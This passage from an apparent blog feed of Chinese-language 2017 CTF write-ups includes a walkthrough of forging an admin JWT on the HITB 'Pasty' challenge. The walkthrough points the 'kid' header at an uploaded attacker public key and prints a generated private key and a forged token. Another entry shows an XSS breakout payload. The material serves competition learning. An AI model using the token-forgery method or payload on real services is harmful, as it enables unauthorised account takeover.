<p>解出来为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">w</div><div class="line">k</div><div class="line">f</div><div class="line">b</div><div class="line">3&apos;↑[↑l↑#↑&#123;w$↓&gt;b↓ag↓[e↓ci.[↑[f↑&#123;k↑n$↑ju&#125;↓:↓3↓u↓%=↑~↑y↑6↑,&apos;↓p↓b↓7↓%&amp;↑d↑0↑j↑pt↓i↓a↓[↓k(↑=↑r↑m↑]=↓0↓d↓&gt;↓lc↑*↑_↑&#123;↑j%↓u↓s↓(↓*2↑0↑n↑&apos;↑;9↓h↓4↓]↓y4↑&apos;↑k↑;↑+p↓f↓e↓$↓!&#125;↑1↑_↑k↑s&amp;↓s↓2↓c↓%q↑$↑.↑!↑#,↓s↓0↓c↓z3↑e↑&#125;↑-↑i</div></pre></td></tr></table></figure></p>
<p>打出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">w&#123;w$ju&#125;,&apos;pt]=j%;9+ps&amp;#,</div><div class="line">k#&gt;bn$:6pjim0&#123;u&apos;h;fks!s-</div><div class="line">flag&#123;k3yb0ard_sn4ke_2.0&#125;</div><div class="line">b[[e[fu~7d[=&gt;*(0]&apos;$1c$ce</div><div class="line">3&apos;ci.[%=%&amp;k(lc*2y4!&#125;%qz3</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-USB ducker-writeup&lt;br&gt;usb keyboard pcap&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="Forensic" scheme="http://yoursite.com/tags/Forensic/"/>
    
  </entry>
  
  <entry>
    <title>HITB CTF 2017-Pasty-writeup</title>
    <link href="http://yoursite.com/2017/08/29/HITB-CTF-2017-Pasty-writeup/"/>
    <id>http://yoursite.com/2017/08/29/HITB-CTF-2017-Pasty-writeup/</id>
    <published>2017-08-28T23:44:02.000Z</published>
    <updated>2017-08-29T01:23:04.302Z</updated>
    
    <content type="html"><![CDATA[<p>HITB CTF 2017-Pasty-writeup</p>
<p>JWT安全性问题<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Can you find the administrator&apos;s secret message?</div><div class="line">http://47.74.147.52:20012</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>先看看基本功能。<br>注册：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/2.png?raw=true" alt=""></p>
<p>登陆：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/3.png?raw=true" alt=""></p>
<p>写paste，保存:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/4.png?raw=true" alt=""></p>
<p>可以对保存的paste进行下载:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/7.png?raw=true" alt=""></p>
<p>可以看到注册后返回了一大串的字符串，之后写paste保存时即以这个字符串作为身份认证。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJjaHliZXRhIn0.nlSBeeMh5XvdSjs0j_Rs71n0EGBYfrzKfkDq2vnR4jrgYiHCzlZ4R2uwsn0mf3Cpqis6bSAxqB-FR1Af5KYFZe6X_gWf57du4JmPfueHumijptaEJ6Ym23AcIS0HoFSV45PoTv6McEf6vvd0SG7SdECoFv97MCl3mMraedyTCy5p1WJ0ssnOs886Noyn5ak01Eeoi3WA3lVMGflIAft_uIx0pRlUZrkB3WWNYMsecWS9ih1fpMvb-cUYP5s6T_QjW68mQ40QArKa7iRDm3IhNipRa_RmziwPdo1Nh2l0kGGALpBhd1kqh8KdEbp2Kz_sPza6O-iJBX88ImeMEgXI5A</div></pre></td></tr></table></figure></p>
<p>刚接触时不知道是啥，就拿去用base64解了一下，虽然解出来后后面出现了一大堆的乱码，不过前面解出来入下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;,&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125;</div></pre></td></tr></table></figure></p>
<p>然后就开始查找关于JWT的资料了。在 <a href="https://jwt.io/" target="_blank" rel="external">https://jwt.io/</a> 上可以对字符串进行debugger。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/5.png?raw=true" alt=""></p>
<p>JWT由三部分组成。第一部分是头部，原始信息是json格式，包含使用的算法(alg)，类型(typ)，可选的kids字段，将头部原始信息进行base64编码后得到了第一部分字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ</div></pre></td></tr></table></figure></p>
<p>第二部分是payload，原始信息是json格式，包含一些重要信息，比如本题中是<code>&quot;sub&quot;: &quot;chybeta&quot;</code>，这对应着账号的用户，将这部分原始信息进行base64编码后得到第二部分字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eyJzdWIiOiJjaHliZXRhIn0</div></pre></td></tr></table></figure></p>
<p>第三部分，将第一部分和第二部分字段用点号<code>.</code>连接后根据第一部分里的alg算法进行签名。在本题中采用的是RS256算法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nlSBeeMh5XvdSjs0j_Rs71n0EGBYfrzKfkDq2vnR4jrgYiHCzlZ4R2uwsn0mf3Cpqis6bSAxqB-FR1Af5KYFZe6X_gWf57du4JmPfueHumijptaEJ6Ym23AcIS0HoFSV45PoTv6McEf6vvd0SG7SdECoFv97MCl3mMraedyTCy5p1WJ0ssnOs886Noyn5ak01Eeoi3WA3lVMGflIAft_uIx0pRlUZrkB3WWNYMsecWS9ih1fpMvb-cUYP5s6T_QjW68mQ40QArKa7iRDm3IhNipRa_RmziwPdo1Nh2l0kGGALpBhd1kqh8KdEbp2Kz_sPza6O-iJBX88ImeMEgXI5A</div></pre></td></tr></table></figure></p>
<p>在服务器返回给我们的头部信息中，有一个是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;</div></pre></td></tr></table></figure></p>
<p>关于kid字段(key ID)，它指定了用哪一个key来加密。可以看看这里：<a href="https://stackoverflow.com/questions/43867440/whats-the-meaning-of-the-kid-claim-in-a-jwt-token" target="_blank" rel="external">What’s the meaning of the “kid” claim in a JWT token?</a></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.74.147.52:20012/keys/</div></pre></td></tr></table></figure></p>
<p>可以发现里面有许多pem公钥，我们字段相符合即为3c3c2ea1c3f113f649dc9389dd71b851.pem。</p>
<p>结合头部的alg信息，我们知道它采用的是SH256即sha256签名，这种方式下，发送方（即我们）要用私钥对签名进行加密，接收方（即服务器端）用公钥进行解密，而从头部kid字段知道，公钥的地址实际上是我们可以指定的。所以攻击流程如下:</p>
<ol>
<li>我们先生成公钥私钥对。</li>
<li>用公钥私钥在 jwt.io 上进行签名伪造jwt，其中kid字段指明我们公钥的地址。</li>
<li>服务器端收到jwt后，用kid字段地址中的公钥进行解密，由于公钥和私钥是我们伪造的，所以解密是能成功的。</li>
<li>拿flag。</li>
</ol>
<p>利用openssl生成公钥私钥对。<br>公钥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-----BEGIN PUBLIC KEY-----</div><div class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCdgyNwNiMLtNqIp9y/Iz5q7jsE</div><div class="line">rbxerAjPzF+vkAhbMEZb0+3LzK22kE6ArHBtDeME0gxCM1dBZgXVZ0Mg+yyKnUIv</div><div class="line">Co9mGCJ7rFsw9BAOIAGGu3pnwr5CDt05qTsarlDxZ1BBsSnH51OtYZvyclGSuPpb</div><div class="line">xW+zblOEFj0443zTRwIDAQAB</div><div class="line">-----END PUBLIC KEY-----</div></pre></td></tr></table></figure></p>
<p>私钥:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">-----BEGIN RSA PRIVATE KEY-----</div><div class="line">MIICXAIBAAKBgQCdgyNwNiMLtNqIp9y/Iz5q7jsErbxerAjPzF+vkAhbMEZb0+3L</div><div class="line">zK22kE6ArHBtDeME0gxCM1dBZgXVZ0Mg+yyKnUIvCo9mGCJ7rFsw9BAOIAGGu3pn</div><div class="line">wr5CDt05qTsarlDxZ1BBsSnH51OtYZvyclGSuPpbxW+zblOEFj0443zTRwIDAQAB</div><div class="line">AoGAVfIodCIWHV0hoU929BSXCmHTckoabs4QQNKTo4hEBv3gZlrNdlbIssUrEKsG</div><div class="line">7XqWVRsH9VduVREGPduKlYR4WI8yPrjUygUuH7GyrC2w44VtCZQ+3zLObknC7RuA</div><div class="line">+DBWgpMTBNF2f3Tpsj6kkSZXN97X1jS9azUkK1uxeJcG8YECQQDI6s3CjTPwQlr3</div><div class="line">h9kxEFPZDIbqjJjWjzY9CFP+A1nOOsrOjNSj9Mf+Qv/n6oLglLopzSu2hM7Iozwg</div><div class="line">7EBjWiYrAkEAyLH/ROQNFmgrBC+QV7HUsOdgQDPiCftEADZSm+IMzpItoTMMHhQB</div><div class="line">UVjJl8TLd8qajItN+mOBb6Eoddq7u5X1VQJAevvff1tXk5XKgQJS3EmWSaH1Y9U0</div><div class="line">KQH4vVs/rpj2e9pZEh36e3H2iZkRdDCEdFwVqEjCnTKmMQJaZ/y1XRttiQJBAJca</div><div class="line">pSZ6SXxIW7LgGN5d7tRusGJGbfaz7sP2IoZpUNkq6B4JcCMpTsCvh8C0E7mSmoAc</div><div class="line">1k4iIy8n+G2bjWM0Ca0CQHHZ/PXOoCKCGi8mB98pdB36VjbTX81giIboYJXhbVeu</div><div class="line">vXvP1EUuGsjDfk+bX1oFxgauqOA7i7oY+sN5JNdO5Fk=</div><div class="line">-----END RSA PRIVATE KEY-----</div></pre></td></tr></table></figure></p>
<p>用之前注册的账号写一个paste，内容为公钥<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/9.png?raw=true" alt=""></p>
<p>利用下载功能获取到公钥的保存地址，这里为 /api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/10.png?raw=true" alt=""></p>
<p>我们想要让服务器端用我们的公钥来加密，所以在伪造jwt的头部的kid字段应为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;kid&quot;:&quot;/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&quot;</div></pre></td></tr></table></figure></p>
<p>但是由前面观察keys文件夹知道，服务器端会把传进来的url后面加上<code>.pem</code>。即<code>&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;</code>会变成去访问<code>keys/3c3c2ea1c3f113f649dc9389dd71b851.pem</code></p>
<p>可以在<code>?raw</code>后面加上一个<code>&amp;</code>，这样加上去后的<code>.pem</code>不会变成后缀而是被当成一个参数。访问 <a href="http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&amp;.pem" target="_blank" rel="external">http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&amp;.pem</a> 即访问 <a href="http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw" target="_blank" rel="external">http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw</a> ，即我们paste/公钥的保存地址。</p>
<p>接下来用 <a href="https://jwt.io/" target="_blank" rel="external">https://jwt.io/</a> 来生成伪造的jwt。由于要伪造admin，所以sub字段要修改为admin。在公钥和私钥部分填上我们生成的公钥和私钥，在头部kid字段填上公钥的地址。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/8.png?raw=true" alt=""></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eyJraWQiOiJhcGkvcGFzdGUvZmNiODI5MTItMWM4NC00Y2U2LTk3MTMtNzU1ZDVmMTQyMDY2P3JhdyYiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.IW5dnvpZAnsmIb4CrAPdwcTApLMzuB4LaDZxzm6nLwRKp4H6SCZUuPi71daWstfUDEGxMmBucTnHmaBCb4VZfxMrKDx0G27J-yJGW-SpGE9j61Punpv0vTaVw0H5SVkU6IZud_OvVWIe6vf_ffmup0Mou7GpCvOn6fUg6XYk8O0</div></pre></td></tr></table></figure></p>
<p>之后在每次操作中，要记得把Authorization字段替换成对应的伪造jwt。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/11.png?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/12.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HITB&#123;b128a14885c4974c4a7016eb1d79aae6&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HITB CTF 2017-Pasty-writeup&lt;/p&gt;
&lt;p&gt;JWT安全性问题&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-H4ck3rM1nd-writeup</title>
    <link href="http://yoursite.com/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/"/>
    <id>http://yoursite.com/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/</id>
    <published>2017-08-28T11:54:28.000Z</published>
    <updated>2017-08-28T12:40:13.280Z</updated>
    
    <content type="html"><![CDATA[<p>跟着wp做的。<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: Even hackers want to share their thoughts :)</div><div class="line">Attachment: (none)</div><div class="line">Webpage: http://tasks.ctf.com.ua:13373</div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/18.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>先看看基本功能。</p>
<p>注册，需要填写一个secret：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/19.png?raw=true" alt=""></p>
<p>登陆后：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/20.png?raw=true" alt=""></p>
<p>可以看一个profile:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/21.png?raw=true" alt=""></p>
<p>而edit点进去后可以修改about字段。</p>
<p>查看profile.php源代码，发现有一些提示：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/22.png?raw=true" alt=""></p>
<p>注意上图，我们在注册时填入的secret是放在input标签里的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Secret: &lt;input id=&quot;secret&quot; name=&quot;secret&quot; value=&quot;mygod&quot; type=&quot;text&quot;/&gt;</div></pre></td></tr></table></figure></p>
<p>如果我们在注册时填写secret为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;/&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;&quot;</div></pre></td></tr></table></figure></p>
<p>也许能构造出xss？但很可惜被过滤掉了：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/23.png?raw=true" alt=""></p>
<p>可以看到<code>&gt;</code>和<code>&lt;</code>都被实体化了。</p>
<p>回到profile.php，查看edit功能，普通的xss攻击不成功，这里会直接把尖括号直接过滤掉。尝试CSS Injection。</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://rioru.github.io/ctf/web/2017/08/27/ctf-writeup-hackit-2017-web200.html" target="_blank" rel="external">CTF Write-Up - HackIT CTF 2017 Web200</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跟着wp做的。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ISG2017-赛前练手题—writeup</title>
    <link href="http://yoursite.com/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/"/>
    <id>http://yoursite.com/2017/08/28/ISG2017-赛前练手题—writeup/</id>
    <published>2017-08-28T11:43:46.000Z</published>
    <updated>2017-08-28T23:54:53.868Z</updated>
    
    <content type="html"><![CDATA[<p>ISG2017-赛前练手题—writeup<br><a id="more"></a></p>
<h1 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在某个员工的电脑上发现了一份奇怪的文件，你能找到什么东西吗？</div><div class="line">奇怪的文件(https://play.chinaisg.org/attachment/download/secret.backup)</div></pre></td></tr></table></figure>
<p>下载下来后打开，看起来是流量包。尾部发现一些base64串。解一下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line">pngdata = <span class="string">"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"</span></div><div class="line"></div><div class="line">f = open(<span class="string">"flag.png"</span>,<span class="string">"wb"</span>)</div><div class="line"></div><div class="line">f.write(base64.b64decode(pngdata))</div><div class="line"></div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
<p>得到一张二维码，扫后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ISG&#123;5a9f1ce5c7359a1b1076b5143b946a3b&#125;</div></pre></td></tr></table></figure></p>
<h1 id="简单的apk"><a href="#简单的apk" class="headerlink" title="简单的apk"></a>简单的apk</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">能够通过APK认证的字符串即为本题flag</div><div class="line"></div><div class="line">下载APK(https://play.chinaisg.org/attachment/download/simple-code.apk)</div></pre></td></tr></table></figure>
<p>其实这是mobile，干脆写在这里不另开了。用jeb打开，然后发现是kotlin，先果断放弃哈哈哈。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ISG2017-赛前练手题—writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-Weekands of hacker-writeup</title>
    <link href="http://yoursite.com/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/"/>
    <id>http://yoursite.com/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/</id>
    <published>2017-08-28T11:00:09.000Z</published>
    <updated>2017-08-28T11:25:24.982Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-Weekands of hacker-writeup<br>脑脑脑洞题？<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: Try to find something weird here...</div><div class="line">Attachment: (none)</div><div class="line">Webpage: (none)</div><div class="line">Hint: Format answer is h4ck1t&#123;&lt;something&gt;&#125;. You must type right flag on keyboard, where? Feel you real hacker. Hide</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>没有给出网址，那就只能在<code>https://ctf.com.ua</code>里咯。</p>
<p>在<code>https://ctf.com.ua/js/jquery.js</code>里有一段：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">typer:<span class="function"><span class="keyword">function</span>(<span class="params">key</span>)</span>&#123;</div><div class="line">    $m=[<span class="number">70</span>,<span class="number">70</span>,<span class="number">71</span>,<span class="number">79</span>,<span class="number">86</span>,<span class="number">74</span>,<span class="number">71</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">74</span>,<span class="number">77</span>,<span class="number">86</span>,<span class="number">81</span>,<span class="number">95</span>];<span class="comment">//times alt is pressed for Access Granted</span></div><div class="line">    $c=Typer.counter<span class="number">-211</span>;</div><div class="line">	<span class="keyword">if</span> (!Typer.failed &amp;  $c&gt;=<span class="number">0</span>)&#123;</div><div class="line">		<span class="keyword">if</span> (!(key==$m[$c]-$c))&#123;</div><div class="line">			Typer.failed=<span class="literal">true</span>;</div><div class="line">			Typer.makeDenied();</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>($c+<span class="number">1</span>==$m.length)&#123;</div><div class="line">			Typer.makeAccess()</div><div class="line">		&#125;</div><div class="line">	&#125;<span class="comment">// remove all existing popuccess();</span></div><div class="line">&#125;,</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">key = <span class="string">""</span></div><div class="line">m = [<span class="number">70</span>,<span class="number">70</span>,<span class="number">71</span>,<span class="number">79</span>,<span class="number">86</span>,<span class="number">74</span>,<span class="number">71</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">74</span>,<span class="number">77</span>,<span class="number">86</span>,<span class="number">81</span>,<span class="number">95</span>]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</div><div class="line">    key += chr(m[i]-i)</div><div class="line">print(key)</div></pre></td></tr></table></figure>
